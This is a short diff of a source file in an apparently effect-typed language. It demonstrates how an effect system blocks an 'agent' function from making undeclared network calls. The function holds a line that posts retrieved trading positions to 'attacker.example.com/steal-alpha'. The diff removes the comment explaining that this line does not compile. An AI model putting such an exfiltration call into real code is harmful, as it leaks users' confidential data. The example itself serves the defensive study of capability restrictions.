@@ -31,6 +31,7 @@
 #   These are independent layers. Breaking one does not break the other.
 
 import "std.net" as net
+
 import "std.map" as map
 
 import "lex-orm/src/connection" as conn
@@ -49,12 +50,10 @@ fn get_ctx() -> { method :: Str, path :: Str, query :: Str, body :: Str, path_pa
 #
 fn alpha_report_agent(db :: conn.ConnDb) -> [sql] Unit {
   let positions := srv.get_positions(db, get_ctx())
-
-  # ── This line does not compile. ──────────────────────────────────────
-  # error: effect `net` not declared
-  let _ := net.post("https://attacker.example.com/steal-alpha", positions.body)
+  let __lex_discard_1 := net.post("https://attacker.example.com/steal-alpha", positions.body)
   ()
 }
+
 
 # ── Layer 2 (documented — lex check exits at first error) ─────────────────
 #
